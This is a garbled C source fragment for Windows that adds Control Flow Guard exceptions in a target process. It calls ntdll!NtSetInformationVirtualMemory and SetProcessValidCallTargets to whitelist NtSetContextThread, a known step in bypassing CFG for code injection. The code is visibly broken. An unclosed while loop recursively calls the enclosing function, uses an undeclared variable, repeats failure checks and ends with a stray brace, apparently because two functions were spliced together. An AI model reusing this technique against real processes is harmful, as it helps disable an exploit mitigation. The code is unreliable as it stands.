void AddCfgExceptionUndocumentedApi(HANDLE hProcess, PVOID pvAddress)
{
	DWORD							dwOutput = 0;
	NTSTATUS						ntStatus = 0;
	SIZE_T							stRegionSize = 0;
	VM_INFORMATION					tVmInformation = { 0 };
	PVOID							pvAllocationBase = NULL;
	ESTATUS							eReturn = ESTATUS_INVALID;
	MEMORY_RANGE_ENTRY				tVirtualAddresses = { 0 };
	CFG_CALL_TARGET_INFO			tCfgCallTargetInfo = { 0 };
	_NtSetInformationVirtualMemory	pfnNtSetInformationVirtualMemory = NULL;
	
	// Get the address of ntdll!NtSetInformationVirtualMemory
	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		NTSETINFORMATIONVIRTUALMEMORY, 
		(PVOID *) &pfnNtSetInformationVirtualMemory
		);
	
	// Get memory allocation base and region size by calling VirtualProtect.
	eReturn = GetMemoryAllocationBaseAndRegionSize(
		pvAddress, 
		&pvAllocationBase, 
		&stRegionSize
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

    if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

    
	tCfgCallTargetInfo.Flags = CFG_CALL_TARGET_VALID;
	tCfgCallTargetInfo.Offset = (ULONG_PTR)pvAddress - (ULONG_PTR)pvAllocationBase;

	tVirtualAddresses.NumberOfBytes = stRegionSize;
	tVirtualAddresses.VirtualAddress = pvAllocationBase;
	tVmInformation.dwNumberOfOffsets = 0x1;
	tVmInformation.dwMustBeZero = 0x0;
	tVmInformation.pdwOutput = &dwOutput;
	tVmInformation.ptOffsets = &tCfgCallTargetInfo;

	printf("[*] Adding a CFG exception for 0x%X using NtSetInformationVirtualMemory.\n\n\n", pvAddress);
	ntStatus = pfnNtSetInformationVirtualMemory(
		hProcess, 
		VmCfgCallTargetInformation, 
		1, 
		&tVirtualAddresses, 
		&tVmInformation, 
		0x10
		);
	if (STATUS_SUCCESS != ntStatus)
	{
		eReturn = ESTATUS_ADDCFGEXCEPTIONUNDOCUMENTEDAPI_NTSETINFORMATIONVIRTUALMEMORY_FAILED;
		goto lblCleanup;
	}

	printf("[*] Exception added successfully.\n\n\n");
	eReturn = ESTATUS_SUCCESS;

    while( STATUS_SUCCESS == ntStatus){
        // Get the address of ntdll!NtSetContextThread
	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		NTSETCONTEXTTHREAD, 
		&pvAddressToAddCfgExceptionTo
		);
	

	eReturn = OpenProcessByName(TARGET_PROCESS_NAME, &hProcess);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	// Add a CFG exception using ntdll!NtSetInformationVirtualMemory
	eReturn = AddCfgExceptionUndocumentedApi(
		hProcess,
		pvAddressToAddCfgExceptionTo
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	
    if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
    
	// Add a CFG exception using KernelBase!SetProcessValidCallTargets
	eReturn = AddCfgExceptionDocumentedApi(
		hProcess, 
		pvAddressToAddCfgExceptionTo
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if (NULL != hProcess)
	{
		CloseHandle(hProcess);
		hProcess = NULL;
	}

	
}

}